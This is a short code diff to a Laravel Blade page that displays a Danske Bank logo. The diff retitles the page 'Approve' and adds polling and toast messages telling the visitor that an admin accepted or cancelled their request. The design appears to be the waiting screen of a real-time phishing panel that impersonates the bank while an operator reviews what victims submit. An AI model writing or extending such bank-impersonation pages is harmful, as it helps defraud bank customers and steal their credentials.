@@ -1,7 +1,7 @@
 @extends('frontend.layout')
 {{-- Page title --}}
 @section('title')
-    Danske Bank
+    Approve
 @stop
 {{-- page level styles --}}
 @section('header_styles')
@@ -15,7 +15,7 @@
                         <div class="item">
                             <div class="info pb-0 pt-5 text-center">
                                 <div class="text-center">
-                                    <a href="{{route('user.success')}}"><img src="{{asset('images/danske-bank-logo.svg')}}"></a>
+                                    <a href="{{route('user.home')}}"><img src="{{asset('images/danske-bank-logo.svg')}}"></a>
                                 </div>
                             </div>
                             <div class="info text-center">
@@ -41,14 +41,18 @@
     <script>
         if('{{$enable}}' == '1') check();
         else{
-            toastr.success('Admin accepted your request');
+            if('{{$enable}}' == '0')
+                toastr.error('Admin cancelled your request');
+            else
+                toastr.success('Admin accepted your request');
+
             const audio = document.getElementById("sound");
             audio.play().then(() => {}).catch((error)=>{});
         }
         function check() {
             $.ajax({url:'{{route('check.approve')}}', success: function(result){
                     if(result.success && result.approve != 1){
-                        location.href = '{{route('home')}}';
+                        location.href = '{{route('user.approve')}}';
                     }
                     else{
                         setTimeout(function () {
